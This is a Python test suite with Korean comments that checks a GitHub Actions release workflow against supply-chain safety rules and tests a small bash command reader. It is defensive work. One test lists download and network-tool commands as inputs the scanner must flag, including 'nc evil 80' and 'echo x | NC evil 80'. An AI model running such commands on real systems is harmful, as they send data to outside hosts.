"""릴리스 워크플로 `.github/workflows/release.yml` 의 규칙 시험 — T3(운영자 확인 048 ①, 이슈 #289 승인 범위: 새 파일 하나를 병합하지 않는 가지에 준비 + 새 액션 download-artifact 한 개 + 이 구조 시험).
**병합·`workflow_dispatch` 실행·서명 키 만들기·시크릿 입력·저장소 설정·태그·릴리스 공개는 승인 밖**이고 운영자만 한다(결정 D-880에서 D-885).

글만 읽는다(네트워크·GitHub·PyYAML 없이 — 앱 CI 네 칸에서 같은 방식으로 돈다). 설계서 RELEASE 3-7 의 규칙 W-1에서 W-16 을 **글을 구조로 읽어**(`tests/workflow_yaml_support.py` — 흐름식·앵커·겹친 키·보이지 않는 글자는 거절,
값 자리의 정확히 `{}`·`[]` 만 빈 매핑·빈 목록) 견준다. 지키는 것: 트리거는 `workflow_dispatch` 하나·입력칸 0(W-1) · 최상위 `permissions: {}`(W-2) · 잡 권한은 build = contents 읽기 + actions 읽기, sign-and-draft = contents 쓰기뿐(W-3) ·
`secrets.` 는 `UPDATE_SIGNING_KEY` 하나이고 `environment: release` 잡의 서명 단계 env 에만(W-4) · 모든 `uses` 가 40자리 SHA 이고 허용 네 개(W-5)이며 checkout 은 `persist-credentials: false`(W-6) · `run` 안에 달러 두 중괄호 식 0(W-7) ·
sign-and-draft 의 `run` 은 허용된 명령만(W-8) · 모든 `gh release create` 에 `--draft`, 공개 호출 0(W-9) · `--target` 은 env 로 받은 전체 커밋 SHA(W-10) · 업로드는 허용 모양·보존 1일·없으면 실패(W-11) · 잡마다 `timeout-minutes`(W-12) ·
`concurrency` release·취소 안 함(W-13) · `environment` 는 sign-and-draft 에만(W-14) · 바깥 내려받기는 build 의 이름이 붙은 한 단계에만(W-15) · 기존 규칙(`secret_output_problems`·액션 고정·승인된 액션 쌍·산출물 허용 목록)도 통과(W-16).
그 위에 **구조 허용 목록**(잡·단계의 이름·순서·액션·with·env·run 글을 글자 그대로)이 있어 규칙이 못 보는 변경도 운영자 눈에 띈다.
규칙 검사 자체를 좋은 글(진짜 파일) 하나와 나쁜 글 백 가지 안팎으로 시험하고 어느 규칙이 잡았는지 이름표(`W-n`)를 본다. 이 워크플로가 GitHub 러너에서 실제로 도는지·초안이 태그를 만드는지·`gh` 의 동작은 여기서 확인할 수 없다(병합 뒤 운영자의 첫 실행).
"""
import ast
import os
import re
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

sys.path.insert(0, str(Path(__file__).resolve().parent))
import release_workflow_support as support  # noqa: E402
import test_workflow_artifacts as wf  # noqa: E402
import workflow_golden as golden  # noqa: E402
import workflow_yaml_support as yamlsub  # noqa: E402

ROOT = support.ROOT
WORKFLOW = support.WORKFLOW
REAL = WORKFLOW.read_text(encoding="utf-8").replace("\r\n", "\n") if WORKFLOW.exists() else ""
SIGN_HEAD = "\n  sign-and-draft:\n"
OTHER_SHA = "0123456789abcdef0123456789abcdef01234567"
# 지시서(운영자 확인 048 ① 승인)가 적은 값 — 소스의 다른 상수와 따로 글자 그대로 적어 두 값이 같은지 본다
APPROVED = {"actions/checkout": ("11d5960a326750d5838078e36cf38b85af677262", "v4.4.0"), "actions/setup-python": ("a26af69be951a213d495a4c3e4e4022e16d87065", "v5.6.0"),
            "actions/upload-artifact": ("ea165f8d65b6e75b540449e92b4886f43607fa02", "v4.6.2"), "actions/download-artifact": ("d3f86a106a0bac45b974a628896c90dbdf5c8093", "v4.3.0")}
CHECKOUT = "actions/checkout@" + APPROVED["actions/checkout"][0]
SETUP = "actions/setup-python@" + APPROVED["actions/setup-python"][0]
UPLOAD = "actions/upload-artifact@" + APPROVED["actions/upload-artifact"][0]
DOWNLOAD = "actions/download-artifact@" + APPROVED["actions/download-artifact"][0]
URL = re.compile(r"(?i)(https?|ftp)://|www[.]")
TILDE = chr(0x7E)


def code_lines(text):
    return [line for line in text.replace("\r\n", "\n").split("\n") if not line.lstrip().startswith("#")]


def mutate(old, new, count=1):
    assert REAL.count(old) == count, (old, REAL.count(old))
    return REAL.replace(old, new)


def mutate_build(old, new, count=1):
    head, tail = REAL.split(SIGN_HEAD, 1)
    assert head.count(old) == count, (old, head.count(old))
    return head.replace(old, new) + SIGN_HEAD + tail


def mutate_sign(old, new, count=1):
    head, tail = REAL.split(SIGN_HEAD, 1)
    assert tail.count(old) == count, (old, tail.count(old))
    return head + SIGN_HEAD + tail.replace(old, new)


INJECT_ANCHOR = '          cd "$RUNNER_TEMP/release"\n          echo "### 공개 전 확인 목록" >> "$GITHUB_STEP_SUMMARY"\n'


def inject_sign(line):
    """sign-and-draft 의 마지막 단계(작업 요약)의 run 안, 맨 앞 `cd` 줄 바로 뒤에 명령 한 줄을 끼운다(같은 들여쓰기라 블록 글의 일부다)."""
    return mutate_sign(INJECT_ANCHOR, '          cd "$RUNNER_TEMP/release"\n          ' + line + '\n          echo "### 공개 전 확인 목록" >> "$GITHUB_STEP_SUMMARY"\n')


def edit(*triples):
    """진짜 글에 (옛 글, 새 글, 나오는 횟수) 여러 개를 차례로 적용한다 — 옛 글이 정확히 그 횟수만큼 나오지 않으면 시험이 틀린 것이다."""
    text = REAL
    for old, new, count in triples:
        assert text.count(old) == count, (old, text.count(old))
        text = text.replace(old, new)
    return text


PACKAGE_RUN = '        run: python packaging/build_package.py --out-dir "$RUNNER_TEMP/package"\n'


def inject_build(line):
    """build 의 '묶음과 휴대용 압축 파일 만들기' 단계의 run 을 블록 글로 바꾸고 원래 명령 뒤에 명령 한 줄을 끼운다."""
    return mutate_build(PACKAGE_RUN, '        run: |\n          python packaging/build_package.py --out-dir "$RUNNER_TEMP/package"\n          ' + line + "\n")


def step_text(name):
    """진짜 글에서 이름이 `name` 인 단계의 글 조각(앞의 `      - name:` 줄부터 다음 단계 앞의 빈 줄까지)."""
    start = REAL.index("      - name: " + name + "\n")
    end = REAL.find("\n\n", start)
    return REAL[start:end + 1] if end > 0 else REAL[start:]


def line_with(needle, nth=0):
    found = [line for line in REAL.split("\n") if needle in line]
    return found[nth]


class RealWorkflowTest(unittest.TestCase):
    def test_the_file_exists_and_the_reader_reads_it_into_the_expected_shape(self):
        self.assertTrue(WORKFLOW.is_file(), "release.yml 이 있어야 한다(NO-MERGE 가지의 준비물)")
        tree = yamlsub.load(REAL)
        self.assertEqual(list(tree), ["name", "on", "permissions", "concurrency", "defaults", "jobs"])
        self.assertEqual(tree["name"], "Release — 릴리스 초안 만들기(수동)")
        self.assertEqual((tree["on"], tree["permissions"], tree["defaults"]), ({"workflow_dispatch": None}, {}, {"run": {"shell": "bash"}}))
        self.assertEqual(tree["concurrency"], {"group": "release", "cancel-in-progress": "false"})
        self.assertEqual(list(tree["jobs"]), ["build", "sign-and-draft"])

    def test_the_workflow_follows_every_rule(self):
        self.assertEqual(support.release_violations(REAL), [])

    def test_the_job_table_is_what_the_design_and_the_docs_say(self):
        """설계서 3-2 의 잡·권한 표 — 러너·권한·시크릿·환경·시간 한도·단계 수."""
        jobs = yamlsub.load(REAL)["jobs"]
        build, sign = jobs["build"], jobs["sign-and-draft"]
        self.assertEqual((build["runs-on"], build["permissions"], build["timeout-minutes"], build.get("environment"), build.get("needs")), ("windows-latest", {"contents": "read", "actions": "read"}, "45", None, None))
        self.assertEqual((sign["runs-on"], sign["permissions"], sign["timeout-minutes"], sign["environment"], sign["needs"]), ("ubuntu-latest", {"contents": "write"}, "15", "release", "build"))
        self.assertEqual((len(build["steps"]), len(sign["steps"])), (9, 13))
        self.assertEqual(build["env"], {"PYTHONUTF8": "1"})
        self.assertEqual(sign["env"], {"PYTHONUTF8": "1"})
        secret_steps = [step["name"] for step in sign["steps"] if "env" in step and "UPDATE_SIGNING_KEY" in step["env"]]
        self.assertEqual(secret_steps, ["서명과 자체 검증(비밀은 이 단계에만)"])
        self.assertTrue(all("UPDATE_SIGNING_KEY" not in step.get("env", {}) for step in build["steps"]), "build 잡에는 비밀이 없다")
        self.assertEqual(len([line for line in code_lines(REAL) if "secrets." in line]), 1, "비밀 참조는 파일 전체에서 한 줄이다")

    def test_exactly_four_actions_are_pinned_to_the_values_the_approval_names(self):
        refs = golden.all_action_refs(REAL)
        self.assertEqual(sorted(set(refs)), sorted(name + "@" + sha for name, (sha, _version) in APPROVED.items()))
        self.assertEqual(len(refs), 6, "checkout·setup-python 은 두 잡에서 한 번씩, upload 는 build, download 는 sign-and-draft")
        for name, (sha, version) in APPROVED.items():
            self.assertRegex(REAL, re.escape(name + "@" + sha) + r"  # " + re.escape(version) + r"\n", name + " 의 버전 주석")
        self.assertEqual(support.ACTIONS, {name: sha for name, (sha, _version) in APPROVED.items()}, "도우미의 SHA 와 승인 값이 같다")

    def test_the_new_action_is_used_by_release_yml_alone_and_the_three_old_ones_keep_their_values(self):
        for name, text in wf.workflow_texts().items():
            if name != "release.yml":
                self.assertNotIn("download-artifact", text, f"{name}: 새 액션은 release.yml 한 파일에서만 쓴다(운영자 확인 048 ① — 다른 워크플로에는 승인이 없다)")
        self.assertEqual(golden.ACTIONS, {name: APPROVED[name][0] for name in ("actions/checkout", "actions/setup-python", "actions/upload-artifact")}, "ci.yml·package.yml 의 승인 목록은 그대로다")
        self.assertEqual(golden.RELEASE_ONLY_ACTIONS, {"actions/download-artifact": APPROVED["actions/download-artifact"][0]})
        self.assertEqual(golden.APPROVED_REFS, frozenset(name + "@" + sha for name, (sha, _version) in APPROVED.items()))

    def test_the_other_existing_guards_accept_it_too(self):
        self.assertEqual(wf.secret_output_problems(REAL), [])
        self.assertEqual(wf.artifact_problems(REAL), [])
        self.assertEqual(wf.main_upload_notes({"release.yml": REAL}), [], "새 워크플로 파일의 업로드는 알림 대상이 아니다")
        self.assertEqual(golden.action_problems(REAL), [])
        self.assertIn("release.yml", wf.workflow_texts())
        for ref in golden.all_action_refs(REAL):
            self.assertRegex(ref, r"^[\w.-]+/[\w./-]+@[0-9a-f]{40}$")                 # test_repo_layout 의 SHA 고정 시험과 같은 모양

    def test_there_is_exactly_one_upload_and_its_six_paths_fit_the_allowed_shapes(self):
        uploads = wf.upload_steps(REAL)
        self.assertEqual(len(uploads), 1)
        paths = wf.upload_paths(uploads[0][1])
        self.assertEqual(paths, [support.RELEASE_DIR + "/" + leaf for leaf in support.UPLOAD_LEAVES])
        for path in paths:
            self.assertEqual(wf.path_problem(path), "", path)
        self.assertTrue({path.rsplit("/", 1)[1] for path in paths} <= set(wf.ALLOWED_UPLOAD_FILES))
        step = yamlsub.load(REAL)["jobs"]["build"]["steps"][7]
        self.assertEqual((step["with"]["retention-days"], step["with"]["if-no-files-found"], step["with"]["name"]), ("1", "error", "release-candidate"))
        download = yamlsub.load(REAL)["jobs"]["sign-and-draft"]["steps"][3]
        self.assertEqual(download["with"]["name"], step["with"]["name"], "올리는 산출물과 받는 산출물의 이름이 같다")

    def test_the_trigger_is_manual_only_with_no_input_and_nothing_else_can_start_it(self):
        text = REAL.split("\non:\n", 1)[1].split("\npermissions:", 1)[0]
        self.assertEqual([line for line in text.split("\n") if line.strip()], ["  workflow_dispatch:"])
        code = "\n".join(code_lines(REAL))
        for word in ("pull_request", "pull_request_target", "schedule:", "workflow_run", "workflow_call", "repository_dispatch", "issue_comment", "release:", "inputs", "push:"):
            self.assertNotIn(word, code, word)
        self.assertNotIn("github.event", code)
        self.assertNotIn("${{ inputs.", code)

    def test_no_run_line_has_an_expression_and_nothing_in_the_file_can_publish_or_skip_a_failure(self):
        for job in yamlsub.load(REAL)["jobs"].values():
            for _position, _name, body in support.run_bodies(job):
                self.assertNotIn("${{", body)
        code = "\n".join(code_lines(REAL))
        for word in ("--publish", "--draft=false", "release edit", "release upload", "release delete", "--latest", "continue-on-error", "set -x", "printenv", "if:"):
            self.assertNotIn(word, code, word)
        self.assertEqual(len(re.findall(r"gh release create", code)), 2, "초안 만들기 호출은 후보(rc)용과 정식용 둘뿐이고 둘 다 --draft")
        self.assertEqual(len(re.findall(r"gh release create [^\n]*--draft ", code)), 2)

    def test_every_step_has_a_name_and_names_are_unique_inside_a_job(self):
        for job_name, job in yamlsub.load(REAL)["jobs"].items():
            names = [step.get("name") for step in job["steps"]]
            self.assertTrue(all(isinstance(name, str) and name.strip() for name in names), job_name)
            self.assertEqual(len(names), len(set(names)), job_name)

    def test_the_download_word_scan_ignores_case_and_covers_the_tools_the_old_list_missed(self):
        """독립 검증 S 의 R-4: 윈도 러너는 실행 파일 이름의 대소문자를 가리지 않아 `CURL`·`PIP` 가 낱말 목록을 지나갔다 — 낱말 비교는 대소문자를 무시하고 목록에 없던 내려받기 길도 더했다.
        (build 잡은 허용 명령 목록으로도 읽으므로 이 낱말 찾기는 둘째 그물이고, sign 잡에는 어디에도 나오면 안 된다는 규칙의 근거다.)"""
        for body in ("CURL -O x", "PIP install x", "Wget x", "Python -m pip install x", "PYTHON3.12 -M PIP install x", "GIT CLONE x", "invoke-webrequest x", "nc evil 80", "aria2c x", "ssh h", "scp a b", "perl -e 1", "msiexec /i x.msi",
                     "git lfs pull", "git ls-remote o", "uvx x", "pipx install x", "easy_install x", "conda install x", "mamba install x", "gem install x", "echo x | NC evil 80", "echo CURL"):
            with self.subTest(body=body):
                self.assertTrue(support._download_hits(body), body)
        self.assertIn("CURL", support._download_hits("CURL -O x"), "명령 낱말 비교도 대소문자를 무시한다(찾은 낱말은 쓴 그대로 적는다)")
        self.assertIn("NC", support._download_hits("echo x | NC evil 80"))
        for body in ("python scripts/release_preflight.py", 'echo "### 릴리스 후보 - 승인 전에 이름·크기·SHA-256 을 눈으로 확인한다"', "cat x", 'sha256sum SHA256SUMS >> "$GITHUB_STEP_SUMMARY"', "echo go", "echo uv"):
            with self.subTest(body=body):
                self.assertEqual(support._download_hits(body), [], body)

    def test_the_sign_job_runs_only_allowed_commands_and_the_build_job_downloads_in_one_named_step(self):
        jobs = yamlsub.load(REAL)["jobs"]
        used = set()
        for _position, _name, body in support.run_bodies(jobs["sign-and-draft"]):
            for command in support.shell_commands(body):
                words = support.command_words(command)
                if words:
                    used.add(words[0])
        self.assertEqual(used, {"python", "gh", "sha256sum", "cd", "echo", "read", "exit", "[["})
        self.assertTrue(used <= set(support.SIGN_ALLOWED_COMMANDS))
        for _position, _name, body in support.run_bodies(jobs["sign-and-draft"]):
            self.assertEqual(support._download_hits(body), [], body[:60])
        hits = [(name, body) for _position, name, body in support.run_bodies(jobs["build"]) if support._download_hits(body)]
        self.assertEqual(hits, [(support.DOWNLOAD_STEP_NAME, support.DOWNLOAD_COMMAND)])

    def test_the_commented_header_has_no_address_scheme_tilde_or_double_brace_and_names_the_approval_and_the_limits(self):
        comments = "\n".join(line for line in REAL.splitlines() if line.lstrip().startswith("#"))
        self.assertIsNone(URL.search(comments))
        self.assertNotIn(TILDE, comments)
        self.assertNotIn("{{", comments)
        for line in code_lines(REAL):
            if TILDE in line:                                                      # 코드의 물결표는 bash 의 정규식 비교 `=` + 물결표 하나뿐이다(버전 글 모양 확인) — 문서·주석의 물결표 금지와 다른 이야기다
                self.assertIn("=" + TILDE + " ", line)
                self.assertEqual(line.count(TILDE), 1, line)
        for needle in ("확인 048", "T3", "NO-MERGE", "수동 실행", "docs/RELEASE.md", "download-artifact", "초안", "러너에서만 확인되는 것", "단계 8", "installer_smoke.py", "update_smoke.py"):
            self.assertIn(needle, comments, needle)

    def test_the_comment_marking_the_place_for_the_next_lane_sits_between_the_installer_step_and_the_candidate_step(self):
        names = [step["name"] for step in yamlsub.load(REAL)["jobs"]["build"]["steps"]]
        self.assertEqual(names.index("설치 파일 만들기(Inno Setup 판 확인·기록 포함)") + 1, names.index("후보 목록 만들기(버전 사슬 확인)"), "그 사이에 다음 갈래가 설치 스모크·업데이트 시뮬레이션을 더한다")
        between = REAL.split("      - name: 설치 파일 만들기(Inno Setup 판 확인·기록 포함)\n", 1)[1].split("      - name: 후보 목록 만들기", 1)[0]
        self.assertIn("설치 스모크(설계서 단계 8)와 업데이트 시뮬레이션(단계 9)은 이 자리에 다음 갈래가 단계를 더한다", between)

    def test_crlf_line_endings_do_not_change_the_verdict(self):
        self.assertEqual(support.release_violations(REAL.replace("\n", "\r\n")), [])

    def test_comments_do_not_count_as_secrets_write_triggers_or_publish_words(self):
        text = REAL.replace("# 이 파일은 초안까지만 만든다", "# secrets.TOKEN permissions: write push: pull_request schedule: --publish gh release edit set -x 낱말은 주석이라 센 것이 아니다\n# 이 파일은 초안까지만 만든다", 1)
        self.assertIn("# secrets.TOKEN permissions: write push:", text)
        self.assertEqual(support.release_violations(text), [])

    def test_an_unreadable_or_odd_text_is_a_violation_not_a_crash(self):
        for text in ("", "not: [a mapping", "- a\n- b\n", chr(0xFEFF) + "name: x\n", "a: 1\n\tb: 2\n", "name: x\n" * 3, "jobs: x\n", "name: x\njobs:\n  - a\n"):
            with self.subTest(text=text[:20]):
                self.assertTrue(support.release_violations(text))
        self.assertTrue(support.release_violations(mutate("# 이 파일은 초안까지만 만든다", "# 이 파일은" + chr(0x2028) + "  push: 숨김")), "줄 나눔처럼 읽히는 글자는 읽개가 거절한다")

    def test_both_steps_that_use_the_version_check_its_shape_first_and_survive_a_missing_final_newline(self):
        """초안 만들기·사후 점검은 VERSION 을 읽어 jq 프로그램·gh 인자에 끼우므로 읽은 글의 모양(정식 X.Y.Z·후보 X.Y.Z-rc.N)을 먼저 확인한다. 끝 줄바꿈이 없는 VERSION 도 `read` 의 종료 코드로 멈추지 않게 대비한다."""
        sign = yamlsub.load(REAL)["jobs"]["sign-and-draft"]
        for name in ("초안 만들기(공개하지 않는다)", "사후 점검(초안이 있고 태그는 아직 없다)"):
            body = next(step["run"] for step in sign["steps"] if step["name"] == name)
            self.assertEqual(body.splitlines()[:3], list(support.VERSION_LINES), name)
        pattern = re.compile(support.VERSION_LINES[1].split("'")[1])
        for good in ("1.0.0", "0.9.0", "10.20.30", "0.9.0-rc.1", "1.0.0-rc.12"):
            self.assertRegex(good, pattern)
        for bad in ("1.0", "1.0.0-preview.1", "1.0.0-rc", "1.0.0-rc.", "v1.0.0", "1.0.0 ", "1.0.0" + chr(13), "1.0.0" + chr(10) + "x", "1.0.0-rc.1-x", "", "1.0.0'", '1.0.0" ] | .', "1.0.0$(x)", "1.0.0;ls"):
            self.assertIsNone(pattern.fullmatch(bad), repr(bad))

    def test_every_rule_label_the_design_names_is_in_the_checker(self):
        source = (Path(__file__).resolve().parent / "release_workflow_support.py").read_text(encoding="utf-8")
        for number in range(1, 17):
            self.assertIn(f"W-{number}:", source, f"W-{number}")


class ScriptNamesTest(unittest.TestCase):
    """워크플로가 부르는 스크립트의 이름과 인자 — 다른 갈래(설치 구현 V1INSTALL·릴리스 R-1·R-2 V1REL12)가 같은 시각에 만드는 스크립트라 **이 가지에는 없는 것이 있다**.
    스크립트가 있으면 그 소스가 워크플로가 쓰는 하위 명령 이름과 `--옵션` 이름을 글자(문자열 상수)로 가지고 있어야 하고(병합 가지에서 둘이 만나면 어긋남을 이 시험이 먼저 잡는다), 없으면 건너뛰고 표준 오류에 알림 한 줄을 남긴다."""

    def called_scripts(self):
        found = []
        for job_name, job in yamlsub.load(REAL)["jobs"].items():
            for position, name, body in support.run_bodies(job):
                for command in support.shell_commands(body):
                    words = support.command_words(command)
                    if words[:1] == ["python"] and len(words) >= 2 and words[1].endswith(".py"):
                        found.append((job_name, position, words[1], words[2:]))
        return found

    def test_the_workflow_calls_the_scripts_the_design_names(self):
        scripts = [item[2] for item in self.called_scripts()]
        self.assertEqual(scripts, ["scripts/release_preflight.py", "packaging/build_package.py", "packaging/build_installer.py", "packaging/release_chain.py",
                                   "scripts/release_preflight.py", "scripts/update_manifest.py", "scripts/update_manifest.py", "scripts/update_sign.py",
                                   "packaging/release_chain.py", "packaging/release_chain.py", "packaging/release_chain.py"])

    def test_every_script_that_exists_knows_the_subcommand_and_the_options_the_workflow_uses(self):
        for job_name, position, script, arguments in self.called_scripts():
            path = ROOT / script
            if not path.is_file():
                sys.stderr.write(f"정보: {script} 는 이 가지에 아직 없다(다른 갈래가 만든다) — 병합 가지에서 합쳐질 때 이 시험이 하위 명령·옵션 이름을 견준다\n")
                continue
            constants = {node.value for node in ast.walk(ast.parse(path.read_text(encoding="utf-8"))) if isinstance(node, ast.Constant) and isinstance(node.value, str)}
            with self.subTest(job=job_name, step=position, script=script):
                for argument in arguments:
                    if argument.startswith("--"):
                        self.assertIn(argument, constants, f"{script} 에 옵션 {argument} 가 없다 — 워크플로와 스크립트의 인자가 어긋났다")
                    elif re.fullmatch(r"[a-z][a-z-]*", argument):
                        self.assertIn(argument, constants, f"{script} 에 하위 명령 {argument} 가 없다 — 워크플로와 스크립트의 인자가 어긋났다")

    def test_the_one_script_every_branch_has_is_really_checked(self):
        build_package = [item for item in self.called_scripts() if item[2] == "packaging/build_package.py"]
        self.assertEqual(len(build_package), 1)
        self.assertTrue((ROOT / "packaging" / "build_package.py").is_file())
        self.assertEqual(build_package[0][3], ["--out-dir", "$RUNNER_TEMP/package"])
        source = (ROOT / "packaging" / "build_package.py").read_text(encoding="utf-8")
        self.assertIn('"--out-dir"', source)


class ShellReaderTest(unittest.TestCase):
    """`release_workflow_support.shell_commands` — sign-and-draft 의 run 을 명령 낱말로 읽는 작은 bash 읽개."""

    def words(self, body):
        """명령마다 낱말 목록(제어 낱말만 있는 `then`·`else`·`fi` 줄은 빈 목록이라 뺀다)."""
        return [words for words in (support.command_words(command) for command in support.shell_commands(body)) if words]

    def test_commands_are_split_at_newlines_semicolons_and_or_pipes_and_comments_are_dropped(self):
        self.assertEqual(self.words("a 1\nb 2; c 3 && d 4 || e 5 | f 6\n# 주석 g 7\nh 8 # 끝 주석"), [["a", "1"], ["b", "2"], ["c", "3"], ["d", "4"], ["e", "5"], ["f", "6"], ["h", "8"]])

    def test_quotes_and_escapes_are_removed_and_expansions_are_kept_as_text(self):
        self.assertEqual(self.words('echo "a b" \'c d\' e\\ f "$X/y" ${Z}'), [["echo", "a b", "c d", "e f", "$X/y", "${Z}"]])
        self.assertEqual(self.words("echo 'a\"b' \"c'd\" \"q\\\"q\""), [["echo", 'a"b', "c'd", 'q"q']])
        self.assertEqual(self.words('x "a"\'b\'"c"'), [["x", "abc"]], "붙어 있는 따옴표 조각은 한 낱말")
        self.assertEqual(self.words('echo "# 따옴표 속 샵" #주석'), [["echo", "# 따옴표 속 샵"]])

    def test_line_continuations_join_lines(self):
        self.assertEqual(self.words("a one \\\n  two\nb"), [["a", "one", "two"], ["b"]])

    def test_control_words_and_assignments_are_stripped_from_the_front(self):
        self.assertEqual(self.words('if [[ "$v" == *-rc.* ]]; then\n  gh x\nelse\n  gh y\nfi'), [["[[", "$v", "==", "*-rc.*", "]]"], ["gh", "x"], ["gh", "y"]])
        self.assertEqual(self.words("name=value cmd arg"), [["cmd", "arg"]])
        self.assertEqual(self.words("! cmd"), [["cmd"]])

    def test_redirects_are_separated_from_the_words_with_their_targets(self):
        commands = support.shell_commands('sha256sum a b > SHA256SUMS\necho x >> "$GITHUB_STEP_SUMMARY"\ngh api x > /dev/null 2>&1\nread -r version < VERSION')
        self.assertEqual([command["words"] for command in commands], [["sha256sum", "a", "b"], ["echo", "x"], ["gh", "api", "x"], ["read", "-r", "version"]])
        self.assertEqual([command["redirects"] for command in commands], [[(">", "SHA256SUMS")], [(">>", "$GITHUB_STEP_SUMMARY")], [(">", "/dev/null"), (">&", "1")], [("<", "VERSION")]])

    def test_a_jq_program_in_single_quotes_with_the_version_spliced_in_is_one_word(self):
        body = """gh api "repos/${GITHUB_REPOSITORY}/releases" --jq 'map(select(.draft and .tag_name == "v'"${version}"'")) | if length == 1 then "\\(.name)" else error("x") end'"""
        (words,) = self.words(body)
        self.assertEqual(words[:3], ["gh", "api", "repos/${GITHUB_REPOSITORY}/releases"])
        self.assertEqual(words[3], "--jq")
        self.assertEqual(words[4], 'map(select(.draft and .tag_name == "v${version}")) | if length == 1 then "\\(.name)" else error("x") end')
        self.assertEqual(len(words), 5)

    def test_every_notation_it_does_not_read_is_refused(self):
        cases = (("명령 치환", "echo $(date)"), ("따옴표 속 명령 치환", 'echo "$(date)"'), ("백틱", "echo `date`"), ("따옴표 속 백틱", 'echo "`date`"'), ("프로세스 치환", "cat <(echo x)"), ("출력 프로세스 치환", "tee >(cat)"),
                 ("여기 문서", "cat <<EOF\nx\nEOF"), ("여기 문자열", "cat <<< x"), ("백그라운드", "sleep 9 &"), ("묶는 괄호", "(cd x; ls)"), ("함수·괄호", "f() { ls; }"), ("산술 확장", "echo $((1+1))"),
                 ("매개변수 확장 기본값", "echo ${X:-y}"), ("매개변수 확장 간접", "echo ${!X}"), ("매개변수 확장 길이", "echo ${#X}"), ("닫히지 않은 따옴표", 'echo "x'), ("닫히지 않은 작은따옴표", "echo 'x"),
                 ("대상 없는 방향 바꾸기", "echo x >"), ("앰퍼샌드 방향 바꾸기", "echo x &> y"), ("연달아 방향 바꾸기", "echo x > > y"))
        for label, body in cases:
            with self.subTest(case=label):
                with self.assertRaises(support.ShellUnsafe):
                    support.shell_commands(body)

    def test_a_plain_dollar_name_and_a_special_parameter_are_read_as_text(self):
        self.assertEqual(self.words('echo $HOME "$?" $1 ${A_b1}'), [["echo", "$HOME", "$?", "$1", "${A_b1}"]])

    def test_each_command_records_how_it_was_joined_to_the_one_before(self):
        """독립 검증 S 의 R-1: 읽개가 `||`·`&&`·`|`·`;` 를 구별하지 않고 명령만 나눠서 `… || echo skipped` 가 두 개의 허용 명령으로 보였다 — 이제 명령마다 앞의 연결을 남긴다."""
        commands = support.shell_commands("a\nb; c && d || e | f\ng &&\n h\n\ni ||\n\n j")
        self.assertEqual([(command["words"][0], command["sep"]) for command in commands],
                         [("a", "plain"), ("b", "plain"), ("c", ";"), ("d", "&&"), ("e", "||"), ("f", "|"), ("g", "plain"), ("h", "&&"), ("i", "plain"), ("j", "||")],
                         "연산자 뒤에서 줄(과 빈 줄)을 바꿔도 이음은 이어진다")
        self.assertEqual([command["sep"] for command in support.shell_commands("\n\nx\n")], ["plain"])

    def test_each_command_records_its_expansions_and_whether_they_were_quoted(self):
        commands = support.shell_commands('echo "$A" $B ${C} "${D}x" \'$E\' $?\n[[ "$version" =~ $re ]]')
        self.assertEqual(commands[0]["expansions"], [("$A", True), ("$B", False), ("${C}", False), ("${D}", True), ("$?", False)], "작은따옴표 속은 확장이 아니다")
        self.assertEqual(commands[1]["expansions"], [("$version", True), ("$re", False)])
        self.assertEqual(support.shell_commands("echo plain")[0]["expansions"], [])
        self.assertEqual(support.shell_commands('echo >> "$GITHUB_STEP_SUMMARY"')[0]["expansions"], [("$GITHUB_STEP_SUMMARY", True)], "방향 바꾸기 대상의 확장도 센다")

    def test_a_hash_inside_a_word_is_not_a_comment_but_a_hash_starting_a_word_is(self):
        """독립 검증 Q 의 K80: 낱말 가운데의 `#` 를 주석으로 읽으면 `echo a#b; curl x` 의 curl 이 주석 속에 가려져 W-8 이 놓친다."""
        self.assertEqual(self.words("echo a#b; curl x"), [["echo", "a#b"], ["curl", "x"]])
        self.assertEqual(self.words("echo a #b; curl x"), [["echo", "a"]], "단어 맨 앞의 # 는 줄 끝까지 주석이다")
        self.assertEqual(self.words('echo "a #b" c#d'), [["echo", "a #b", "c#d"]])
        self.assertEqual(self.words("x=a#b y"), [["y"]], "대입 낱말 속의 # 도 낱말의 일부다")

    def test_a_dollar_escaped_by_a_backslash_inside_double_quotes_is_a_plain_dollar_and_not_an_expansion(self):
        """독립 검증 Q 의 K86: 큰따옴표 속 역슬래시 + 달러는 글자 달러다(확장이 아니다) — 풀지 않으면 확장으로 세어 허용 변수 검사가 어긋난다."""
        backslash = chr(0x5C)
        commands = support.shell_commands('echo "' + backslash + '$HOME" "$HOME" "' + backslash + backslash + '"')
        self.assertEqual(commands[0]["words"], ["echo", "$HOME", "$HOME", backslash])
        self.assertEqual(commands[0]["expansions"], [("$HOME", True)], "역슬래시로 막은 달러는 확장으로 세지 않는다")
        self.assertEqual(support.shell_commands("echo '" + backslash + "$HOME'")[0]["words"], ["echo", backslash + "$HOME"], "작은따옴표 속은 그대로")

    def test_each_quoting_and_separator_notation_has_its_own_reading(self):
        """독립 검증 Q 의 K78·K79·K81에서 K85 가 가린 읽개의 판정을 문장 하나씩 못박는다(규칙 시험이 겹쳐서만 잡던 것)."""
        self.assertEqual(self.words("a;b"), [["a"], ["b"]])
        self.assertEqual(self.words("a|b"), [["a"], ["b"]])
        for text in ("a &", "a & b", "(a)", "echo $(date)", 'echo "$(date)"', 'echo "`date`"', "echo ${X:-y}", "echo ${#X}", 'echo "x', "echo 'x"):
            with self.subTest(text=text):
                with self.assertRaises(support.ShellUnsafe):
                    support.shell_commands(text)
        self.assertEqual(support.shell_commands("echo x 2>&1 > y")[0]["redirects"], [(">&", "1"), (">", "y")], "파일 번호 2 는 방향 바꾸기의 일부이고 낱말이 아니다")
        self.assertEqual(support.shell_commands("echo x 2> y")[0]["words"], ["echo", "x"])


class ShellShapeTablesTest(unittest.TestCase):
    """규칙 W-8·W-15 의 허용 모양 표(`SIGN_PYTHON`·`BUILD_PYTHON`·`SHELL_VARIABLES`·`SIGN_TESTS`·`ASSET_NAMES`)가 진짜 워크플로가 쓰는 것과 정확히 같다 — 남는 항목도 모자란 항목도 없다
    (남는 항목은 쓰지 않는 길을 열어 두는 것이다). 독립 검증 S 의 R-1·R-2·R-4."""

    def commands(self, job):
        found = []
        for _position, _name, body in support.run_bodies(yamlsub.load(REAL)["jobs"][job]):
            found += support.shell_commands(body)
        return found

    def test_the_allowed_python_command_lines_are_exactly_the_ones_the_real_workflow_calls(self):
        sign = {tuple(command["words"]) for command in self.commands("sign-and-draft") if command["words"][:1] == ["python"]}
        self.assertEqual(sign, set(support.SIGN_PYTHON))
